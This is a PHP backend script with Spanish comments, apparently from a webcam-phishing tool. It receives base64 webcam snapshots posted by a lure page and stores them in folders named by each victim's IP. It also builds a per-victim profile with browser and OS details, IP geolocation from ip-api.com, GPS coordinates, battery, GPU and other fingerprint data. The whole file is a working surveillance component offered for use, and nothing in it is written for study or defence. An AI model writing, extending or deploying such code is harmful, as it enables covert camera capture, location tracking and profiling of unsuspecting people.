<?php
$date = date('dMYHis');
$imageData = isset($_POST['cat']) ? $_POST['cat'] : '';
if (!empty($imageData)) {
    error_log("[#]Cam file received" . "\r\n", 3, "Log.log");
}

/* --- Detectar la IP de la victima (misma logica que ip.php) --- */
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
/* Si vienen varias IPs separadas por coma, tomar la primera */
$ip = trim(explode(',', $ip)[0]);

/* Sanitizar para usarla como nombre de carpeta (IPv4/IPv6) */
$safeIp = preg_replace('/[^0-9a-fA-F.:]/', '', $ip);
if ($safeIp === '' || $safeIp === '.') {
    $safeIp = 'unknown';
}

/* ================== HELPERS DE INFORMACION ================== */

/* Parsear el User-Agent: navegador, SO y tipo de dispositivo */
function parseUA($ua) {
    $browser = 'Desconocido';
    if (stripos($ua, 'Edg/') !== false)            $browser = 'Microsoft Edge';
    elseif (stripos($ua, 'OPR/') !== false)        $browser = 'Opera';
    elseif (stripos($ua, 'SamsungBrowser')!==false)$browser = 'Samsung Internet';
    elseif (stripos($ua, 'Chrome/') !== false)     $browser = 'Google Chrome';
    elseif (stripos($ua, 'Firefox/') !== false)    $browser = 'Mozilla Firefox';
    elseif (stripos($ua, 'Safari/') !== false)     $browser = 'Safari';
    if (preg_match('/(Chrome|Firefox|Edg|OPR|SamsungBrowser|Version)\/([\d.]+)/', $ua, $m)) {
        $browser .= ' ' . $m[2];
    }
    $os = 'Desconocido';
    if (stripos($ua, 'Android') !== false) {
        $os = 'Android' . (preg_match('/Android ([\d.]+)/', $ua, $m) ? ' ' . $m[1] : '');
    } elseif (stripos($ua, 'iPhone') !== false || stripos($ua, 'iPad') !== false) {
        $os = 'iOS' . (preg_match('/OS ([\d_]+)/', $ua, $m) ? ' ' . str_replace('_', '.', $m[1]) : '');
    } elseif (stripos($ua, 'Windows') !== false) {
        $os = 'Windows' . (preg_match('/Windows NT ([\d.]+)/', $ua, $m) ? ' NT ' . $m[1] : '');
    } elseif (stripos($ua, 'Mac OS X') !== false) {
        $os = 'macOS';
    } elseif (stripos($ua, 'Linux') !== false) {
        $os = 'Linux';
    }
    if (stripos($ua, 'iPad') !== false || stripos($ua, 'Tablet') !== false) $device = 'Tablet';
    elseif (stripos($ua, 'Mobile') !== false || stripos($ua, 'Android') !== false || stripos($ua, 'iPhone') !== false) $device = 'Movil';
    else $device = 'PC/Escritorio';
    return array($browser, $os, $device);
}

/* Geolocalizacion por IP (ip-api.com, gratuito, sin API key).
   Solo se llama una vez por IP, al crear la carpeta. */
function geoLookup($ip) {
    /* IPs privadas/reservadas no se pueden geolocalizar */
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        return "IP privada o reservada (sin geolocalizacion posible)";
    }
    $ctx = stream_context_create(array('http' => array(
        'timeout' => 5,
        'header'  => "User-Agent: symbiote-tool\r\n",
    )));
    $fields = 'status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting';
    $raw = @file_get_contents('http://ip-api.com/json/' . rawurlencode($ip) . '?fields=' . $fields, false, $ctx);
    if ($raw === false) return "No disponible (fallo de consulta)";
    $d = json_decode($raw, true);
    if (!$d || (isset($d['status']) && $d['status'] !== 'success')) {
        return "No disponible (" . (isset($d['message']) ? $d['message'] : 'error') . ")";
    }
    $lines = array(
        "Pais:        " . $d['country'] . " (" . $d['countryCode'] . ")",
        "Region:      " . $d['regionName'],
        "Ciudad:      " . $d['city'] . (isset($d['zip']) && $d['zip'] ? " (CP " . $d['zip'] . ")" : ""),
        "Coordenadas: " . $d['lat'] . ", " . $d['lon'],
        "Zona horaria: " . $d['timezone'],
        "ISP:         " . $d['isp'] . (isset($d['org']) && $d['org'] ? " / " . $d['org'] : ""),
        "AS:          " . (isset($d['as']) ? $d['as'] : '-'),
        "Conexion:    " . ((isset($d['mobile']) && $d['mobile']) ? 'Movil/datos'
                        : ((isset($d['hosting']) && $d['hosting']) ? 'Hosting/VPN'
                        : ((isset($d['proxy']) && $d['proxy']) ? 'Proxy/VPN' : 'Fija/hogar'))),
    );
    return implode("\r\n", $lines);
}

/* Datos enviados por la landing (solo la pagina nueva los manda) */
function deviceFromClient($json) {
    $v = json_decode($json, true);
    if (!is_array($v)) return null;
    $g = function ($k) use ($v) { return isset($v[$k]) && $v[$k] !== '' && $v[$k] !== null ? $v[$k] : '-'; };
    $conn = $g('connection');
    $dl = $g('downlink');
    $rtt = $g('rtt');
    $netDetail = '-';
    if ($conn !== '-') {
        $netDetail = $conn;
        if ($dl !== '-') $netDetail .= ' / ' . $dl . ' Mbps';
        if ($rtt !== '-') $netDetail .= ' / ' . $rtt . ' ms';
    }
    $lines = array(
        "Pantalla:      " . $g('screen') . " @ " . $g('dpr') . "x",
        "Orientacion:   " . $g('orientation'),
        "Ventana:       " . $g('window'),
        "Idiomas:       " . $g('languages'),
        "Zona horaria:  " . $g('timezone'),
        "Nucleos CPU:   " . $g('cores'),
        "RAM aprox.:    " . ($g('memory') !== '-' ? $g('memory') . ' GB' : '-'),
        "GPU:           " . $g('gpu') . ($g('gpuVendor') !== '-' ? " (" . $g('gpuVendor') . ")" : ""),
        "Bateria:       " . ($g('battery') !== '-' ? $g('battery') . ($g('charging') !== '-' ? " (" . $g('charging') . ")" : "") : '-'),
        "Puntos tactiles: " . $g('touch'),
        "Red:           " . $netDetail,
        "Almacenamiento: " . ($g('storage') !== '-' ? $g('storage') . ' (cuota navegador)' : '-'),
        "GPS:           " . ($g('gpsLat') !== '-' && $g('gpsLat') !== ''
                        ? $g('gpsLat') . ", " . $g('gpsLon') . " (precision " . $g('gpsAcc') . ")"
                        : ($g('gpsState') !== '-' && $g('gpsState') !== ''
                            ? "sin datos (permiso: " . $g('gpsState') . ")"
                            : "no disponible")),
        "Origen link:   " . $g('referrer'),
        "DNT:           " . $g('dnt'),
        "Cookies:       " . $g('cookies'),
        "Plataforma:    " . $g('platform'),
    );
    return implode("\r\n", $lines);
}

/* --- Carpeta por IP dentro de CapturedData/ --- */
$mypath = rtrim(trim(file_get_contents("path.txt")), "/");
$folder = $mypath . '/' . $safeIp . '/';
$newFolder = !is_dir($folder);
if ($newFolder) {
    @mkdir($folder, 0777, true);
}

/* --- Guardar la captura --- */
$filteredData = substr($imageData, strpos($imageData, ",") + 1);
$unencodedData = base64_decode($filteredData);
$myFile = $folder . 'cam' . $date . '.png';
$fp = fopen($myFile, 'wb');
fwrite($fp, $unencodedData);
fclose($fp);

/* --- info.txt: se crea con datos completos la primera vez;
       con capturas siguientes se suma la seccion faltante de navegador --- */
$ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'unknown';
list($browser, $os, $device) = parseUA($ua);

if ($newFolder) {
    $info = "========= VICTIMA: " . $ip . " =========\r\n"
          . "Primera captura: " . date('d-M-Y H:i:s') . "\r\n"
          . "\r\n----- DISPOSITIVO (User-Agent) -----\r\n"
          . "Navegador:   " . $browser . "\r\n"
          . "Sistema:     " . $os . "\r\n"
          . "Tipo:        " . $device . "\r\n"
          . "User-Agent:  " . $ua . "\r\n"
          . "\r\n----- GEOLOCALIZACION (por IP) -----\r\n"
          . geoLookup($ip) . "\r\n";
    if (isset($_POST['dev'])) {
        $dev = deviceFromClient($_POST['dev']);
        if ($dev) $info .= "\r\n----- DISPOSITIVO (navegador) -----\r\n" . $dev . "\r\n";
    }
    @file_put_contents($folder . 'info.txt', $info, LOCK_EX);
} else {
    /* La carpeta ya existe: refrescar info.txt en cada captura.
       Se conservan la fecha de primera captura y la geolocalizacion
       cacheada de la primera consulta; los datos de dispositivo y
       navegador se actualizan con lo que llega ahora. */
    $infoFile = $folder . 'info.txt';
    if (file_exists($infoFile)) {
        $old = @file_get_contents($infoFile);
        $first = date('d-M-Y H:i:s');
        if (preg_match('/Primera captura:\s*([^\r\n]+)/', $old, $m)) {
            $first = trim($m[1]);
        }
        if (preg_match('/----- GEOLOCALIZACION \(por IP\) -----\r?\n(.*?)(\r?\n\r?\n|$)/s', $old, $m)) {
            $geo = trim($m[1]);
        } else {
            $geo = geoLookup($ip);
        }
        $dev = isset($_POST['dev']) ? deviceFromClient($_POST['dev']) : null;
        $info = "========= VICTIMA: " . $ip . " =========\r\n"
              . "Primera captura: " . $first . "\r\n"
              . "Ultima captura:  " . date('d-M-Y H:i:s') . "\r\n"
              . "\r\n----- DISPOSITIVO (User-Agent) -----\r\n"
              . "Navegador:   " . $browser . "\r\n"
              . "Sistema:     " . $os . "\r\n"
              . "Tipo:        " . $device . "\r\n"
              . "User-Agent:  " . $ua . "\r\n"
              . "\r\n----- GEOLOCALIZACION (por IP) -----\r\n"
              . $geo . "\r\n";
        if ($dev) {
            $info .= "\r\n----- DISPOSITIVO (navegador) -----\r\n" . $dev . "\r\n";
        }
        @file_put_contents($infoFile, $info, LOCK_EX);
    }
}

exit();
?>
